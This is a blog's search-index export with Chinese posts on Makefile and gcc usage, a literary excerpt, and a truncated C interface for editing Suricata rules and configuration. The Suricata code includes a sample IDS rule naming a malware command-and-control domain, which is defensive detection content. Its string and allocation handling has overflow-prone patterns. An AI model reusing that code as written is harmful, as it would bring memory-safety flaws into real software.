<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Makefile应知应会</title>
    <link href="/posts/86862577/"/>
    <url>/posts/86862577/</url>
    
    <content type="html"><![CDATA[<blockquote><p><code>Makefile</code> 可以简单的认为是一个工程文件的编译规则，描述了整个工程的编译和链接等规则。其中包含了哪些文件需要编译，哪些文件不需要编译，哪些文件需要先编译，哪些文件需要后编译，哪些文件需要重建等等。编译整个工程需要涉及到的，在 <code>Makefile</code> 中都可以进行描述。换句话说，<code>Makefile</code> 可以使得我们的项目工程的编译变得自动化，不需要每次都手动输入一堆源文件和参数。</p><p>把要链接的库文件放在 <code>Makefile</code> 中，制定相应的规则和对应的链接顺序。这样只需要执行 <code>make</code> 命令，工程就会自动编译。每次想要编译工程的时候就执行 <code>make</code> ，省略掉手动编译中的参数选项和命令，非常的方便。</p><p><code>Makefile</code> 支持多线程并发操作，会极大的缩短我们的编译时间，并且当我们修改了源文件之后，编译整个工程的时候，<code>make</code> 命令只会编译我们修改过的文件，没有修改的文件不用重新编译，也极大的解决了我们耗费时间的问题。</p><p><code>gcc</code>使用相关内容见<a href="https://leex0.top/posts/4f2a16e6/">链接</a></p></blockquote><h2 id="1-格式"><a href="#1-格式" class="headerlink" title="1. 格式"></a>1. 格式</h2><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">targets : prerequisitescommand</code></pre></div><p>相关说明如下：</p><ul><li>  targets：规则的目标，可以是 Object File（一般称它为中间文件），也可以是可执行文件，还可以是一个标签；</li><li>  prerequisites：是我们的依赖文件，要生成 targets 需要的文件或者是目标。可以是多个，也可以是没有；</li><li>  command：make 需要执行的命令（任意的 shell 命令）。可以有多条命令，每一条命令占一行。</li></ul><p>Example：</p><div class="code-wrapper"><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile">test:test.cgcc -o test test.c</code></pre></div><p>上述代码实现的功能就是编译 test.c 文件，通过这个实例可以详细的说明 Makefile 的具体的使用。其中 test 是的目标文件，也是我们的最终生成的可执行文件。依赖文件就是 test.c 源文件，重建目标文件需要执行的操作是<code>gcc -o test test.c</code>。这就是 Makefile 的基本的语法规则的使用。</p><p>使用 Makefile 的方式：首先需要编写好 Makefile 文件，然后在 shell 中执行 make 命令，程序就会自动执行，得到最终的目标文件。</p><h2 id="2-规则"><a href="#2-规则" class="headerlink" title="2. 规则"></a>2. 规则</h2><h3 id="2-1-显式规则"><a href="#2-1-显式规则" class="headerlink" title="2.1 显式规则"></a>2.1 显式规则</h3><p>显式规则说明了，如何生成一个或多的的目标文件。这是由 Makefile 的书写者明显指出，要生成的文件，文件的依赖文件，生成的命令。</p><h3 id="2-2隐晦规则"><a href="#2-2隐晦规则" class="headerlink" title="2.2隐晦规则"></a>2.2隐晦规则</h3><p>由于我们的 make 命名有自动推导的功能，所以隐晦的规则可以让我们比较粗糙地简略地书写 Makefile，这是由 make 命令所支持的。</p><h3 id="2-3-变量的定义"><a href="#2-3-变量的定义" class="headerlink" title="2.3 变量的定义"></a>2.3 变量的定义</h3><p>在 Makefile 中我们要定义一系列的变量，变量一般都是字符串，这个有点像C语言中的宏，当 Makefile 被执行时，其中的变量都会被扩展到相应的引用位置上。</p><h3 id="2-4-文件指示"><a href="#2-4-文件指示" class="headerlink" title="2.4 文件指示"></a>2.4 文件指示</h3><p>其包括了三个部分，一个是在一个 Makefile 中引用另一个 Makefile，就像C语言中的 include 一样；另一个是指根据某些情况指定 Makefile 中的有效部分，就像C语言中的预编译 if 一样；还有就是定义一个多行的命令。有关这一部分的内容，我会在后续的部分中讲述。</p><h3 id="2-5-注释"><a href="#2-5-注释" class="headerlink" title="2.5 注释"></a>2.5 注释</h3><p>Makefile 中只有行注释，和 UNIX 的 Shell 脚本一样，其注释是用“#”字符，这个就像 C/C++ 中的“//”一样。如果你要在你的 Makefile 中使用“#”字符，可以用反斜框进行转义，如：“#”。</p><h2 id="3-工作流程"><a href="#3-工作流程" class="headerlink" title="3. 工作流程"></a>3. 工作流程</h2><p>在我们编译项目文件的时候，默认情况下，make 执行的是 Makefile 中的第一规则（Makefile 中出现的第一个依赖关系），此规则的第一目标称之为“最终目标”或者是“终极目标”</p><div class="code-wrapper"><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile">main:main.o test1.o test2.o 《---终极  gcc main.o test1.o test2.o -o main  main.o:main.c test.h  gcc -c main.c -o main.o  test1.o:test1.c test.h  gcc -c test1.c -o test1.o  test2.o:test2.c test.h  gcc -c test2.c -o test2.o</code></pre></div><p>对这些 “.o” 文件为目标的规则处理有下列三种情况：</p><ul><li>  目标 “.o” 文件不存在，使用其描述规则创建它；</li><li>  目标 “.o” 文件存在，目标 “.o” 文件所依赖文件在上一次 make 之后被修改过，则根据规则重新编译生成它；</li><li>  目标 “.o” 文件存在，目标 “.o” 文件在上一次 make 之后没有被修改，则什么也不做。</li></ul><h2 id="4-变量定义与使用"><a href="#4-变量定义与使用" class="headerlink" title="4. 变量定义与使用"></a>4. 变量定义与使用</h2><p>调用变量的时候可以用 “$(VALUE_LIST)” 或者是 “${VALUE_LIST}” 来替换，这就是变量的引用。实例：</p><div class="code-wrapper"><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile">OBJ&#x3D;main.o test.o test1.o test2.otest:$(OBJ) gcc -o test $(OBJ)</code></pre></div><h3 id="变量的基本赋值"><a href="#变量的基本赋值" class="headerlink" title="变量的基本赋值"></a>变量的基本赋值</h3><p>知道了如何定义，下面我们来说一下 Makefile 的变量的四种基本赋值方式：</p><ol><li>简单赋值 ( := ) 编程语言中常规理解的赋值方式，只对当前语句的变量有效。</li><li>递归赋值 ( = ) 赋值语句可能影响多个变量，所有目标变量相关的其他变量都受影响。</li><li>条件赋值 ( ?= ) 如果变量未定义，则使用符号中的值定义变量。如果该变量已经赋值，则该赋值语句无效。</li><li>追加赋值 ( += ) 原变量用空格隔开的方式追加一个新值。</li></ol><ul><li><p>简单赋值</p><div class="code-wrapper"><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile">x:&#x3D;fooy:&#x3D;$(x)bx:&#x3D;newtest：@echo &quot;y&#x3D;&gt;$(y)&quot;@echo &quot;x&#x3D;&gt;$(x)&quot;</code></pre></div><p>在 shell 命令行执行<code>make test</code>我们会看到:</p><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">y&#x3D;&gt;foob  x&#x3D;&gt;new</code></pre></div></li><li><p>递归赋值</p><div class="code-wrapper"><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile">x&#x3D;fooy&#x3D;$(x)bx&#x3D;newtest：@echo &quot;y&#x3D;&gt;$(y)&quot;@echo &quot;x&#x3D;&gt;$(x)&quot;</code></pre></div><p>在 shell 命令行执行<code>make test</code>我们会看到:</p><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">y&#x3D;&gt;newb  x&#x3D;&gt;new</code></pre></div></li><li><p>条件赋值</p><div class="code-wrapper"><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile">x:&#x3D;fooy:&#x3D;$(x)bx?&#x3D;newtest：@echo &quot;y&#x3D;&gt;$(y)&quot;@echo &quot;x&#x3D;&gt;$(x)&quot;</code></pre></div><p>在 shell 命令行执行<code>make test</code>我们会看到:</p><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">y&#x3D;&gt;foob  x&#x3D;&gt;foo</code></pre></div></li><li><p>追加赋值</p><div class="code-wrapper"><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile">x:&#x3D;fooy:&#x3D;$(x)bx+&#x3D;$(y)test：@echo &quot;y&#x3D;&gt;$(y)&quot;@echo &quot;x&#x3D;&gt;$(x)&quot;</code></pre></div><p>在 shell 命令行执行<code>make test</code>我们会看到:</p><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">y&#x3D;&gt;foob  x&#x3D;&gt;foo foob</code></pre></div></li><li><p>自动化变量</p><div class="code-wrapper"><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile">test:test.o test1.o test2.o  gcc -o $@ $^  test.o:test.c test.h  gcc -o $@ $&lt;  test1.o:test1.c test1.h  gcc -o $@ $&lt;  test2.o:test2.c test2.h  gcc -o $@ $&lt;</code></pre></div><p>这个规则模式中用到了 “$@” 、”$&lt;” 和 “$^” 这三个自动化变量，对比之前写的 Makefile 中的命令，我们可以发现 “$@” 代表的是目标文件test，“$^”代表的是依赖的文件，“$&lt;”代表的是依赖文件中的第一个。我们在执行 make 的时候，make 会自动识别命令中的自动化变量，并自动实现自动化变量中的值的替换，这个类似于编译C语言文件的时候的预处理的作用。</p></li></ul><h2 id="5-目标文件搜索"><a href="#5-目标文件搜索" class="headerlink" title="5. 目标文件搜索"></a>5. 目标文件搜索</h2><p>在 Makefile 中可以这样写：</p><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">VPATH :&#x3D; src</code></pre></div><p>我们可以这样理解，把 src 的值赋值给变量 VPATH，所以在执行 make 的时候会从 src 目录下找我们需要的文件。</p><p>当存在多个路径的时候我们可以这样写：</p><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">VPATH :&#x3D; src car</code></pre></div><h2 id="6-示例"><a href="#6-示例" class="headerlink" title="6. 示例"></a>6. 示例</h2><div class="code-wrapper"><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile">exe&#x3D;..&#x2F;release&#x2F;libA.so### 链接目标文件$(exe):libA.o    gcc -o $(exe) -lstdc++ -fPIC -shared -Xlinker libA.o    ### 编译源文件libA.o:libA.cpp    gcc -lstdc++ -c libA.cpp    clean: -rm *.out *.o *.bakexe&#x3D;..&#x2F;release&#x2F;main.out### 链接目标文件### -L ..&#x2F;release  用于指定libA.so所在目录### -lA  链接库文件libA.so$(exe):main.o    gcc -o $(exe) -lstdc++ -Xlinker main.o -L ..&#x2F;release -lA    ### 编译源文件main.o:main.cpp gcc -lstdc++ -c main.cppclean: -rm *.out *.o *.bak</code></pre></div><hr><blockquote><p>参考：<br><a href="https://zhuanlan.zhihu.com/p/359033384">https://zhuanlan.zhihu.com/p/359033384</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
      <category>C</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Makefile</tag>
      
      <tag>C/C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《城南旧事》摘录</title>
    <link href="/posts/273a5d5/"/>
    <url>/posts/273a5d5/</url>
    
    <content type="html"><![CDATA[<blockquote><p>《城南旧事》林海音</p></blockquote><h3 id="1"><a href="#1" class="headerlink" title="# 1"></a># 1</h3><p>因为放学后要练习跳舞，今天回来得晚一点儿。在兴华门的土坡上，我还是习惯地站了一会儿。城墙上面的那片天，是淡红的颜色了，海在这时也会变成红色 的吗？我又默默地背起“我们看海去！我们看海去！……金红的太阳，从海上升起来，……”那么现在不可以说是“金红的太阳，从天上落下去”吗？对的，我将来 要写一本书，我要把天和海分清楚，我要把好人和坏人分清楚，我要把疯子和贼子分清楚，但是我现在却是什么也分不清。</p><h3 id="2"><a href="#2" class="headerlink" title="# 2"></a># 2</h3><p>我哭了，我们毕业生都哭了。我们是多么喜欢长高了变成大人，我们又是多么怕呢！当我们回到小学来的时候，无论长得多么高，多么大，老师！你们要永远拿我当个孩子呀！</p><p>做大人，常常有人要我做大人。</p><p>宋妈临回她的老家的时候说：</p><p>“英子，你大了，可不能跟弟弟再吵嘴！他还小。”</p><p>兰姨娘跟着那个四眼狗上马车的时候说：</p><p>“英子，你大了，可不能招你妈妈生气了！”</p><p>蹲在草地里的那个人说：</p><p>“等到你小学毕业了，长大了，我们看海去。”</p><p>虽然，这些人都随着我长大没了影子了。是跟着我失去的童年也一块儿失去了吗？</p><p>爸爸也不拿我当孩子了，他说：</p><p>“英子，去把这些钱寄给在日本读书的陈叔叔。”</p><p>“爸爸！——”</p><p>“不要怕，英子，你要学做许多事，将来好帮着你妈妈。你最大。”</p><p>于是他数了钱，告诉我怎样到东交民巷的正金银行去寄这笔钱——到最里面的柜子上去要一张寄款单，填上“金柒拾圆也”，写上日本横滨的地址，交给柜台里的小日本儿！</p><p>我虽然很害怕，但是也得硬着头皮去。——这是爸爸说的，无论什么困难的事，只要硬着头皮去做，就闯过去了。</p><p>“闯练，闯练，英子。”我临去时爸爸还这样叮嘱我。</p><p>我心情紧张地手里捏紧一卷钞票到银行去。等到从最高台阶的正金银行出来，看着东交民巷街道中的花圃种满了蒲公英，我高兴地想：闯过来了，快回家去，告诉爸爸，并且要他明天在花池里也种满了蒲公英。</p><p>快回家去！快回家去！拿着刚发下来的小学毕业文凭——红丝带子系着的白纸筒，催着自己，我好像怕赶不上什么事情似的，为什么呀？</p><p>进了家门，静悄悄的，四个妹妹和两个弟弟都坐在院子里的小板凳上，他们在玩沙土，旁边的夹竹桃不知什么时候垂下了好几枝子，散散落落地很不像样，是因为爸爸今年没有收拾它们——修剪、捆扎和施肥。</p><p>石榴树大盆底下也有几粒没有长成的小石榴，我很生气，问妹妹们：</p><p>“是谁把爸爸的石榴摘下来的？我要告诉爸爸去！”</p><p>妹妹们惊奇地睁大了眼，她们摇摇头说：“是它们自己掉下来的。”</p><p>我捡起小青石榴。缺了一根手指头的厨子老高从外面进来了，他说：</p><p>“大小姐，别说什么告诉你爸爸了，你妈妈刚从医院来了电话，叫你赶快去，你爸爸已经……”</p><p>他为什么不说下去了？我忽然着急起来，大声喊着说：</p><p>“你说什么？老高。”</p><p>“大小姐，到了医院，好好儿劝劝你妈，这里就数你大了！就数你大了！”</p><p>瘦鸡妹妹还在抢燕燕的小玩意儿，弟弟把沙土灌进玻璃瓶里。是的，这里就数我大了，我是小小的大人。我对老高说：</p><p>“老高，我知道是什么事了，我就去医院。”我从来没有过这样的镇定，这样的安静。</p><p>我把小学毕业文凭，放到书桌的抽屉里，再出来，老高已经替我雇好了到医院的车子。走过院子，看到那垂落的夹竹桃，我默念着：</p><p>爸爸的花儿落了，</p><p>我也不再是小孩子。</p>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
      <category>杂谈</category>
      
    </categories>
    
    
    <tags>
      
      <tag>摘录</tag>
      
      <tag>城南旧事</tag>
      
      <tag>林海音</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>gcc简记</title>
    <link href="/posts/4f2a16e6/"/>
    <url>/posts/4f2a16e6/</url>
    
    <content type="html"><![CDATA[<p><img src="/posts/4f2a16e6/GCC_CompilationProcess.png"></p><h2 id="编译-Compile"><a href="#编译-Compile" class="headerlink" title="编译 Compile"></a>编译 Compile</h2><p>将源文件编译成目标文件需要使用<code>-c</code>选项，例如：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc -c main.c</code></pre></div><p>就将 main.c 编译为 main.o。打开 demo 目录，就会看到 main.o。</p><p>一个源文件会生成一个目标文件，多个源文件会生成多个目标文件，源文件数目和目标文件数目是一样的。通常情况下，默认的目标文件名字和源文件名字是一样的。</p><p>如果希望自定义目标文件的名字，那么可以使用<code>-o</code>选项，例如：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc -c main.c -o a.o</code></pre></div><p>这样生成的目标文件的名字就是 a.o。</p><h2 id="链接-Link"><a href="#链接-Link" class="headerlink" title="链接 Link"></a>链接 Link</h2><p>在<code>gcc</code>命令后面紧跟目标文件的名字，就可以将目标文件链接成为可执行文件，例如：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc main.o</code></pre></div><p>就将 main.o 链接为 a.out。打开 demo 目录，就会看到 a.out。  </p><p>**在<code>gcc</code>命令后面紧跟源文件名字或者目标文件名字都是可以的，<code>gcc</code>命令能够自动识别到底是源文件还是目标文件：如果是源文件，那么要经过编译和链接两个步骤才能生成可执行文件；如果是目标文件，只需要链接就可以了。 **</p><p>使用<code>-o</code>选项仍然能够自定义可执行文件的名字，例如：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc main.o -o main.out</code></pre></div><p>这样生成的可执行文件的名字就是 main.out。</p><h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><ul><li><code>-c</code>：只产生编译代码</li><li><code>-o</code>：指定输出文件（无 Link）</li><li><code>-Wall</code>：启用所有警告<div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">#include&lt;stdio.h&gt;int main(void)&#123;   int i;   printf(&quot;\n The Geek Stuff [%d]\n&quot;, i);   return 0;&#125;</code></pre></div>上面的代码编译时，会出现<code>未初始化的i</code>类似的警告。<div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ gcc -Wall main.c -o mainmain.c: In function ‘main’:main.c:6:10: warning: ‘i’ is used uninitialized in this function [-Wuninitialized]</code></pre></div></li><li><code>-save-temps</code>：产生所有的中间步骤的文件<div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ gcc -save-temps main.c$ lsa.out   main.bc main.c  main.i  main.o  main.s</code></pre></div></li><li><code>-llibname</code>：链接共享库件（如-lCPPfile）</li><li><code>-I</code>：指定头文件的文件夹</li><li><code>-L</code>：指定库文件的文件夹<blockquote><p>上述三者看起来比较接近，参考下面的例子：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc -o main mian.c -I &#x2F;home&#x2F;hello&#x2F;include -L &#x2F;home&#x2F;hello&#x2F;lib -lworld</code></pre></div><p>上面这句表示在编译·hello.c时：<br><code>-I /home/hello/include</code>表示将/home/hello/include目录作为第一个寻找头文件的目录，寻找的顺序是：/home/hello/include–&gt;/usr/include–&gt;/usr/local/include <br><code>-L /home/hello/lib</code>表示将/home/hello/lib目录作为第一个寻找库文件的目录，寻找的顺序是：/home/hello/lib–&gt;/lib–&gt;/usr/lib–&gt;/usr/local/lib<br><code>-lworld</code>表示在上面的lib的路径中寻找libworld.so动态库文件（如果gcc编译选项中加入了“-static”表示寻找libworld.a静态库文件），程序链接的库名是world</p></blockquote></li><li><code>-V</code>：指定库文件的文件夹</li><li><code>-D</code>：可以使用编译时的宏<div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">#include&lt;stdio.h&gt;int main(void)&#123;#ifdef MY_MACRO  printf(&quot;\n Macro defined \n&quot;);#endif  char c &#x3D; -10;  &#x2F;&#x2F; Print the string   printf(&quot;\n The Geek Stuff [%d]\n&quot;, c);   return 0;&#125;</code></pre></div><code>-D</code>可以用作从命令行定义宏<code>MY_MACRO</code>。<div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ gcc -Wall -DMY_MACRO main.c -o main$ .&#x2F;main Macro defined  The Geek Stuff [-10]</code></pre></div></li><li><code>-static</code>：生成静态链接的文件<br>静态编译文件(把动态库的函数和其它依赖都编译进最终文件)<div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc main.c -static -o main -lpthread</code></pre></div>相反的使用<code>-shared</code>使用动态库链接。</li><li><code>-M</code>：生成文件关联的信息<div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ gcc -M main.cmain.o: main.c \  &#x2F;Library&#x2F;Developer&#x2F;CommandLineTools&#x2F;SDKs&#x2F;MacOSX.sdk&#x2F;usr&#x2F;include&#x2F;stdio.h \  &#x2F;Library&#x2F;Developer&#x2F;CommandLineTools&#x2F;SDKs&#x2F;MacOSX.sdk&#x2F;usr&#x2F;include&#x2F;_stdio.h \  &#x2F;Library&#x2F;Developer&#x2F;CommandLineTools&#x2F;SDKs&#x2F;MacOSX.sdk&#x2F;usr&#x2F;include&#x2F;sys&#x2F;cdefs.h \  &#x2F;Library&#x2F;Developer&#x2F;CommandLineTools&#x2F;SDKs&#x2F;MacOSX.sdk&#x2F;usr&#x2F;include&#x2F;sys&#x2F;_symbol_aliasing.h \...</code></pre></div></li></ul><hr><blockquote><p>参考：<br><a href="http://c.biancheng.net/view/661.html">http://c.biancheng.net/view/661.html</a><br><a href="https://colobu.com/2018/08/28/15-Most-Frequently-Used-GCC-Compiler-Command-Line-Options/#%E6%8C%87%E5%AE%9A%E7%BC%96%E8%AF%91%E8%BE%93%E5%87%BA%E7%9A%84%E5%90%8D%E5%AD%97">https://colobu.com/2018/08/28/15-Most-Frequently-Used-GCC-Compiler-Command-Line-Options/#%E6%8C%87%E5%AE%9A%E7%BC%96%E8%AF%91%E8%BE%93%E5%87%BA%E7%9A%84%E5%90%8D%E5%AD%97</a><br><a href="https://blog.csdn.net/weixin_37569048/article/details/81666879">https://blog.csdn.net/weixin_37569048/article/details/81666879</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
      <category>C</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C/C++</tag>
      
      <tag>gcc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Suricata配置接口</title>
    <link href="/posts/ad19baf/"/>
    <url>/posts/ad19baf/</url>
    
    <content type="html"><![CDATA[<blockquote><p>为<code>Suricata</code>对应的WEB页面开发编写相关接口用以实现配置修改与规则简单管理。</p></blockquote><h2 id="库引入、接口声明、常量定义"><a href="#库引入、接口声明、常量定义" class="headerlink" title="库引入、接口声明、常量定义"></a>库引入、接口声明、常量定义</h2><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;dirent.h&gt;static char **read_rules_file_name();static void alter_select_rules(char **rules_list, int count);static void alter_HOME_NET(char **HOME_NET_list, int count);static void alter_mpm_algo(char *mpm_algo);static void alter_spm_algo(char *spm_algo);static void alter_rule_action(char *rules_name, char *sid, char *action);static void add_custom_rule(char *action, char *protocol, char *stream_rule, char *option_rule);static void insert_specific_line_to_file(char *ins_content, char *load_file, char *des_opt);static char *read_rule_sid(char *src_rule);static void strrp(char *src, char *sub, char *rp, char *p);#define RULES_FILES_PATH &quot;&#x2F;var&#x2F;lib&#x2F;suricata&#x2F;rules&quot;#define CUSTOMRULES_FILE_PATH &quot;&#x2F;var&#x2F;lib&#x2F;suricata&#x2F;rules&#x2F;custom.rules&quot;#define CONFIG_YAML_FILR_PATH &quot;&#x2F;etc&#x2F;suricata&#x2F;suricata.yaml&quot;char *names[100];char sid[20];</code></pre></div><h2 id="接口定义"><a href="#接口定义" class="headerlink" title="接口定义"></a>接口定义</h2><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">&#x2F;* * 功能：读取 RULES_FILES_PATH 路径下所有规则文件名 * 传参：无 * 返回：names规则名二维数组 * usage： * read_rules_file_name(); *&#x2F;static char **read_rules_file_name()&#123;    int n &#x3D; 0;    DIR *directory_pointer;    struct dirent *entry;    char *suffix;    if ((directory_pointer &#x3D; opendir(RULES_FILES_PATH)) &#x3D;&#x3D; NULL)        printf(&quot;Error opening \n &quot;);    else    &#123;        while ((entry &#x3D; readdir(directory_pointer)) !&#x3D; NULL)        &#123;            suffix &#x3D; strrchr(entry-&gt;d_name, &#39;.&#39;);            if (suffix !&#x3D; NULL &amp;&amp; strcmp(suffix, &quot;.rules&quot;) &#x3D;&#x3D; 0)            &#123;                names[n++] &#x3D; entry-&gt;d_name;            &#125;        &#125;        closedir(directory_pointer);    &#125;    return names;&#125;&#x2F;* * 功能：将选择启用的规则集文件写入 CONFIG_YAML_FILR_PATH * 传参：rules_list规则集名称列表,count共启用规则集数目 * 返回：无 * usage: * char *a[] &#x3D; &#123;&quot;ftp.rules&quot;,&quot;dns.rules&quot;,&quot;dos.rules&quot;&#125;; * alter_select_rules(a,3); *&#x2F;static void alter_select_rules(char **rules_list, int count)&#123;    char rule_files[1000] &#x3D; &#123;&quot;rule-files: [&quot;&#125;;    for (int i &#x3D; 0; i &lt; count; i++)    &#123;        if (i !&#x3D; 0)        &#123;            strcat(rule_files, &quot;,&quot;);        &#125;        strcat(rule_files, rules_list[i]);    &#125;    strcat(rule_files, &quot;]\n&quot;);    insert_specific_line_to_file(rule_files, CONFIG_YAML_FILR_PATH, &quot;rule-files:&quot;);&#125;&#x2F;* * 功能：将选择启用的规则集文件写入 CONFIG_YAML_FILR_PATH * 传参：rules_list规则集名称列表,count共启用规则集数目 * 返回：无 * usage: * char *a[] &#x3D; &#123;&quot;192.168.0.0&#x2F;16&quot;,&quot;10.0.0.0&#x2F;8&quot;,&quot;172.16.0.0&#x2F;12&quot;&#125;; * alter_select_rules(a,3); *&#x2F;static void alter_HOME_NET(char **HOME_NET_list, int count)&#123;    char HOME_NET[1000] &#x3D; &#123;&quot;    HOME_NET: \&quot;[&quot;&#125;;    for (int i &#x3D; 0; i &lt; count; i++)    &#123;        if (i !&#x3D; 0)        &#123;            strcat(HOME_NET, &quot;,&quot;);        &#125;        strcat(HOME_NET, HOME_NET_list[i]);    &#125;    strcat(HOME_NET, &quot;]\&quot;\n&quot;);    insert_specific_line_to_file(HOME_NET, CONFIG_YAML_FILR_PATH, &quot;HOME_NET:&quot;);&#125;&#x2F;* * 功能：修改配置文件CONFIG_YAML_FILR_PATH中的mpm_algo选项 * 传参：mpm_algo待修改值 * 返回：无 * usage: * alter_mpm_algo(&quot;hs&quot;); *&#x2F;static void alter_mpm_algo(char *mpm_algo)&#123;    char mpm_algo_option[1000] &#x3D; &#123;&quot;mpm-algo: &quot;&#125;;    strcat(mpm_algo_option, mpm_algo);    strcat(mpm_algo_option, &quot;\n&quot;);    insert_specific_line_to_file(mpm_algo_option, CONFIG_YAML_FILR_PATH, &quot;mpm-algo:&quot;);&#125;&#x2F;* * 功能：修改配置文件CONFIG_YAML_FILR_PATH中的spm_algo选项 * 传参：spm_algo待修改值 * 返回：无 * usage: * alter_spm_algo(&quot;hc&quot;); *&#x2F;static void alter_spm_algo(char *spm_algo)&#123;    char spm_algo_option[1000] &#x3D; &#123;&quot;spm-algo: &quot;&#125;;    strcat(spm_algo_option, spm_algo);    strcat(spm_algo_option, &quot;\n&quot;);    insert_specific_line_to_file(spm_algo_option, CONFIG_YAML_FILR_PATH, &quot;spm-algo:&quot;);&#125;&#x2F;* * 功能：修改指定规则的动作 * 传参：rules_name规则集名称，sid规则标识符，action动作名称 * 返回：无 * usage: * alter_rule_action(&quot;ftp.rules&quot;, &quot;2026691&quot;, &quot;alert&quot;); *&#x2F;static void alter_rule_action(char *rules_name, char *sid, char *action)&#123;    FILE *fp;    FILE *fc;    char *temp_file &#x3D; (char *)malloc(strlen(RULES_FILES_PATH) + strlen(&quot;temp.rules&quot;) + 1);    sprintf(temp_file, &quot;%s&#x2F;%s&quot;, RULES_FILES_PATH, &quot;temp.rules&quot;);    int line_hit &#x3D; 0;    int ch;    char line[1000];    char temp_line[1000];    char *actions[] &#x3D; &#123;&quot;alert&quot;, &quot;pass&quot;, &quot;drop&quot;, &quot;reject&quot;&#125;;    char *load_file &#x3D; (char *)malloc(strlen(RULES_FILES_PATH) + strlen(rules_name) + 1);    sprintf(load_file, &quot;%s&#x2F;%s&quot;, RULES_FILES_PATH, rules_name);    fc &#x3D; fopen(temp_file, &quot;w&quot;);    fp &#x3D; fopen(load_file, &quot;r&quot;);    if (fp &#x3D;&#x3D; NULL || fc &#x3D;&#x3D; NULL)    &#123;        printf(&quot;Error opening \n &quot;);    &#125;    else    &#123;        while (!feof(fp) &amp;&amp; !line_hit)        &#123;            fgets(line, 1000, fp);            if (strstr(line, sid))            &#123;                line_hit &#x3D; 1;            &#125;            else            &#123;                fprintf(fc, &quot;%s&quot;, line);            &#125;        &#125;        strrp(line, actions[0], action, temp_line);        memset(line, 0, 1000);        strrp(temp_line, actions[1], action, line);        memset(temp_line, 0, 1000);        strrp(line, actions[2], action, temp_line);        memset(line, 0, 1000);        strrp(temp_line, actions[3], action, line);        fprintf(fc, &quot;%s&quot;, line);        while ((ch &#x3D; fgetc(fp)) !&#x3D; EOF)        &#123;            fprintf(fc, &quot;%c&quot;, ch);        &#125;        fclose(fc);        fclose(fp);        remove(load_file);        rename(temp_file, load_file);    &#125;&#125;&#x2F;* * 功能：添加自定义规则到 CUSTOMRULES_FILE_PATH 文件中 * 传参：action动作名称，protocol协议名称，stream_rule流量方向规则，option_rule选项规则 * 返回：无 * usage: * char a[1000] &#x3D; &quot;msg:&quot;ET MALWARE STOLENPENCIL CnC Domain in DNS Lookup&quot;; dns.query; content:&quot;client-message.com&quot;; nocase; fast_pattern; endswith; reference:url,asert.arbornetworks.com&#x2F;stolen-pencil-campaign-targets-academia&#x2F;; classtype:command-and-control; sid:2026691; rev:4; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, created_at 2018_12_05, deployment Perimeter, former_category MALWARE, malware_family StolenPencil, performance_impact Low, signature_severity Major, updated_at 2020_09_16;&quot;; * add_custom_rule(&quot;alert&quot;, &quot;dns&quot;, &quot;$HOME_NET any -&gt; any any&quot;, a); *&#x2F;static void add_custom_rule(char *action, char *protocol, char *stream_rule, char *option_rule)&#123;    char *rule_content &#x3D; (char *)malloc(strlen(action) + strlen(protocol) + strlen(stream_rule) + strlen(option_rule) + 20);    sprintf(rule_content, &quot;%s %s %s (%s)&quot;, action, protocol, stream_rule, option_rule);    FILE *fp &#x3D; fopen(CUSTOMRULES_FILE_PATH, &quot;a+&quot;);    if (fp &#x3D;&#x3D; NULL)    &#123;        printf(&quot;Error opening \n &quot;);    &#125;    else    &#123;        fseek(fp, 0, SEEK_END);        fwrite(rule_content, strlen(rule_content), 1, fp);        fclose(fp);    &#125;&#125;&#x2F;* * 